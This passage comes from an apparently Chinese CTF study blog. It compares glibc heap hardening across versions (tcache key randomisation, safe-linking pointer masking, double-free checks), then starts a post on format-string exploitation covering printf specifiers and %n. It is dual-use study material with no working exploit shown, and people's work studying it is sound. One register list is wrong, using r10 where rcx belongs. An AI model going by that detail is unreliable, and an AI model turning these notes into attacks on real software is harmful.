(unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>就是一些检查，检查内存块以及双向链表</p><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>  == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>                            malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                      <span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>                        malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br>                    &#125;<br></code></pre></td></tr></table></figure><p>新增了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="hljs-comment">//检查链表完整性</span><br>                            malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br></code></pre></td></tr></table></figure><p>和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<span class="hljs-comment">//检查连表完整性</span><br>                        malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure><p>就是多了点检查</p><h3 id="top-chunk-1"><a href="#top-chunk-1" class="headerlink" title="top chunk"></a>top chunk</h3><p>多了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure><p>检查<code>top chunk</code>大小是否超过了系统分配的内存总量，若超过则说明内存管理器数据被破坏，就报错</p><h2 id="libc-free-2"><a href="#libc-free-2" class="headerlink" title="_libc_free"></a>_libc_free</h2><p>没变</p><h2 id="int-free-2"><a href="#int-free-2" class="headerlink" title="_int_free"></a>_int_free</h2><p>变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">   coincidence before aborting.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">       few cycles, but don&#x27;t abort.  */</span><br>  &#125;<br><br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>就是在放入<code>tcache</code>时检测一下是不是双重释放，不是的话才放入<code>tcache</code></p><h1 id="glibc-2-35"><a href="#glibc-2-35" class="headerlink" title="glibc-2.35"></a>glibc-2.35</h1><h2 id="tcache-1"><a href="#tcache-1" class="headerlink" title="tcache"></a>tcache</h2><h3 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-type">uintptr_t</span> key;<br>&#125; tcache_entry<br></code></pre></td></tr></table></figure><p><code>key</code>的数据类型发生变化，变成无符号整型</p><p>并且多了初始化<code>key</code>的代码（从<strong>2.34</strong>开始的，原本的key时heap_base+0x10）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The value of tcache_key does not really have to be a cryptographically</span><br><span class="hljs-comment">   secure random number.  It only needs to be arbitrary enough so that it does</span><br><span class="hljs-comment">   not collide with values present in applications.  If a collision does happen</span><br><span class="hljs-comment">   consistently enough, it could cause a degradation in performance since the</span><br><span class="hljs-comment">   entire list is checked to check if the block indeed has been freed the</span><br><span class="hljs-comment">   second time.  The odds of this happening are exceedingly low though, about 1</span><br><span class="hljs-comment">   in 2^wordsize.  There is probably a higher chance of the performance</span><br><span class="hljs-comment">   degradation being due to a double free where the first free happened in a</span><br><span class="hljs-comment">   different thread; that&#x27;s a case this check does not cover.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_key_initialize</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (__getrandom (&amp;tcache_key, <span class="hljs-keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)<br>      != <span class="hljs-keyword">sizeof</span> (tcache_key))<br>    &#123;<br>      tcache_key = random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __WORDSIZE == 64</span><br>      tcache_key = (tcache_key &lt;&lt; <span class="hljs-number">32</span>) | random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过随机化<code>key</code>防止攻击者修改固定的<code>key</code>值来实现攻击</p><h3 id="tcache-put-2"><a href="#tcache-put-2" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br></code></pre></td></tr></table></figure><p>保护<code>next</code>字段指针（加密），具体加密方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br></code></pre></td></tr></table></figure><p>所以此时<code>next</code>字段存储的并不是下一个块的地址，而是加密后的地址</p><h3 id="tcache-get-2"><a href="#tcache-get-2" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br></code></pre></td></tr></table></figure><p>与上面那个配套使用，用于解密</p><h2 id="libc-malloc-3"><a href="#libc-malloc-3" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><p>去除了hook</p><h2 id="int-malloc-3"><a href="#int-malloc-3" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><h3 id="fastbin-4"><a href="#fastbin-4" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">     pp = REVEAL_PTR (victim-&gt;fd);                                     \<br>     <span class="hljs-keyword">if</span> (__glibc_unlikely (pp != <span class="hljs-literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \<br>   &#125;<br></code></pre></td></tr></table></figure><p>解密指针</p><p>检查对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);<br><br><span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>  *fb = REVEAL_PTR (victim-&gt;fd);<br></code></pre></td></tr></table></figure><p>检查对齐</p><p>解密指针</p><p>tcache里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">     <span class="hljs-keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);<br>     <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>*fb = REVEAL_PTR (tc_victim-&gt;fd);<br></code></pre></td></tr></table></figure><p>检查对齐</p><p>解密指针并更新<code>fastbin</code>链表头部</p><h2 id="libc-free-3"><a href="#libc-free-3" class="headerlink" title="_libc_free"></a>_libc_free</h2><p>去除了hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">Dumped fake mmapped chunks do not affect the threshold.  */</span><br>    <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>        &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold<br>        &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>      &#123;<br>        mp_.mmap_threshold = chunksize (p);<br>        mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>        LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                    mp_.mmap_threshold, mp_.trim_threshold);<br>      &#125;<br>    munmap_chunk (p);<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>    MAYBE_INIT_TCACHE ();<br><br>    <span class="hljs-comment">/* Mark the chunk as belonging to the library again.  */</span><br>    (<span class="hljs-type">void</span>)tag_region (chunk2mem (p), memsize (p));<br><br>    ar_ptr = arena_for_chunk (p);<br>    _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>多了19行</p><p>标记内存块是库所有</p><h2 id="int-free-3"><a href="#int-free-3" class="headerlink" title="_int_free"></a>_int_free</h2><p>变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))<br>  &#123;<br>    tcache_entry *tmp;<br>    <span class="hljs-type">size_t</span> cnt = <span class="hljs-number">0</span>;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)<span class="hljs-comment">//解密</span><br>      &#123;<br><span class="hljs-keyword">if</span> (cnt &gt;= mp_.tcache_count)<span class="hljs-comment">//检查链表长度是不是超过了最大长度</span><br>  malloc_printerr (<span class="hljs-string">&quot;free(): too many chunks detected in tcache&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))<span class="hljs-comment">//检查对齐</span><br>  malloc_printerr (<span class="hljs-string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);<br><span class="hljs-keyword">if</span> (tmp == e)<span class="hljs-comment">//检查双重释放</span><br>  malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br><span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">   few cycles, but don&#x27;t abort.  */</span><br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h2 id="加密及解密宏"><a href="#加密及解密宏" class="headerlink" title="加密及解密宏"></a>加密及解密宏</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">   larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">   still works.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>加密：将<code>pos</code>地址右移12位后与<code>ptr</code>异或得到加密数据</p><p>解密相反</p><h1 id="glibc-2-41"><a href="#glibc-2-41" class="headerlink" title="glibc-2.41"></a>glibc-2.41</h1><h2 id="tcache-2"><a href="#tcache-2" class="headerlink" title="tcache"></a>tcache</h2><h3 id="结构体-2"><a href="#结构体-2" class="headerlink" title="结构体"></a>结构体</h3><p>没变</p><h3 id="tcache-put-3"><a href="#tcache-put-3" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>没变</p><h3 id="tcache-get-3"><a href="#tcache-get-3" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get_n</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx, tcache_entry **ep)</span><br>&#123;<br>  tcache_entry *e;<br>  <span class="hljs-keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))<span class="hljs-comment">//若rp直接指向链表头节点，则直接获取</span><br>    e = *ep;<br>  <span class="hljs-keyword">else</span><br>    e = REVEAL_PTR (*ep);<span class="hljs-comment">//否则就解密</span><br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br><br>     <span class="hljs-comment">//更新链表头节点</span><br>  <span class="hljs-keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))<span class="hljs-comment">//若ep直接指向头节点，就解密并更新</span><br>      *ep = REVEAL_PTR (e-&gt;next);<br>  <span class="hljs-keyword">else</span><span class="hljs-comment">//否则就加密更新</span><br>    *ep = PROTECT_PTR (ep, REVEAL_PTR (e-&gt;next));<br><br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>相比于2.35新增可加密解密，提高安全性</p><h2 id="libc-malloc-4"><a href="#libc-malloc-4" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><p>tcache的发生变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-type">bool</span> err = tcache_try_malloc (bytes, &amp;victim);<span class="hljs-comment">//调用函数从tcache中分配内存</span><br><br>  <span class="hljs-keyword">if</span> (err)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">if</span> (victim)<br>      <span class="hljs-keyword">return</span> tag_new_usable (victim);<span class="hljs-comment">//对内存块进行标记，标记为可用</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>将大部分代码封装在了<code>tcache_try_malloc</code>中，下面是代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span><br><span class="hljs-title function_">tcache_try_malloc</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> bytes, <span class="hljs-type">void</span> **memptr)</span><br>&#123;<br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes = checked_request2size (bytes);<span class="hljs-comment">//将请求大小转换为实际需要分配的大小</span><br>  <span class="hljs-keyword">if</span> (tbytes == <span class="hljs-number">0</span>)<span class="hljs-comment">//转换失败的情况</span><br>    &#123;<br>      __set_errno (ENOMEM);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<span class="hljs-comment">//根据实际分配的大小计算tcache bin的索引</span><br><br>  MAYBE_INIT_TCACHE ();<span class="hljs-comment">//初始化tcache（如果没初始化的话）</span><br><br>  <span class="hljs-keyword">if</span> (tcache_available (tc_idx))<span class="hljs-comment">//检查tcache是否可用</span><br>    *memptr = tcache_get (tc_idx);<span class="hljs-comment">//获取内存块</span><br>  <span class="hljs-keyword">else</span><br>    *memptr = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-malloc-4"><a href="#int-malloc-4" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>没变</p><h2 id="libc-free-4"><a href="#libc-free-4" class="headerlink" title="_libc_free"></a>_libc_free</h2><p>没变</p><h2 id="int-free-4"><a href="#int-free-4" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br><br>  size = chunksize (p);<br><br>  _int_free_check (av, p, size);<span class="hljs-comment">//这是检查的函数</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//启用tcache的情况</span></span><br>  <span class="hljs-keyword">if</span> (tcache_free (p, size))<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  _int_free_chunk (av, p, size, have_lock);<span class="hljs-comment">//这是free的函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>被封装在了不同的函数里</p>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><ul><li><p>parameter</p><ul><li><p>n$，获取格式化字符串中的指定参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">例如<br><span class="hljs-type">int</span> a=<span class="hljs-number">0x1111</span>,b=<span class="hljs-number">0x2222</span>,c=<span class="hljs-number">0x3333</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$p&quot;</span>,a,b,c)<br><span class="hljs-comment">//按理来说输出的是0x3333</span><br><span class="hljs-comment">//但我自己执行的时候输出的是$p，不知道什么原因</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>flag</p></li><li><p>field width</p><ul><li>输出的最小宽度</li></ul></li><li><p>precision</p><ul><li>输出的最大长度</li></ul></li><li><p>length，输出的长度</p><ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li><p>type</p><ul><li>d&#x2F;i，有符号整数</li><li>u，无符号整数</li><li>x&#x2F;X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li><strong>n</strong>，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘<code>%</code>‘字面值，不接受任何 flags, width。</li></ul></li></ul><p><img src="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1733155009147.png" alt="格式"></p><h3 id="参数位置"><a href="#参数位置" class="headerlink" title="参数位置"></a>参数位置</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>参数全在栈上</p><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>前6个参数由寄存器存放，rdi存储格式化字符串的地址，也就是说从%6$p在栈上</p><p>rdi  rsi  rdx  r10  r8  r9</p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fmtarg addr</span><br></code></pre></td></tr></table></figure><p>能直接看到地址相对于printf函数和格式化字符串地址的偏移</p><h3 id="常见格式化字符串函数"><a 